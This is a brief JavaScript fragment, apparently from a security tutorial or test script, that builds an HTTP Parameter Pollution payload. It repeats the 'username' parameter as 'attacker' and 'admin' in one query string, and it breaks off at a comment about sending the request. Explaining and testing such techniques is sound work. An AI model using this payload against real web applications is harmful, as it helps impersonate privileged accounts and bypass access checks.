// HPP payload with multiple instances of the same parameter
const hppParams = { username: ["attacker", "admin"] };

// Convert the HPP payload to a URL-encoded string
const hppPayload = Object.keys(hppParams).map((key) => {
  return hppParams[key].map((value) => `${key}=${value}`).join("&");
}).join("&");

// Send the original request
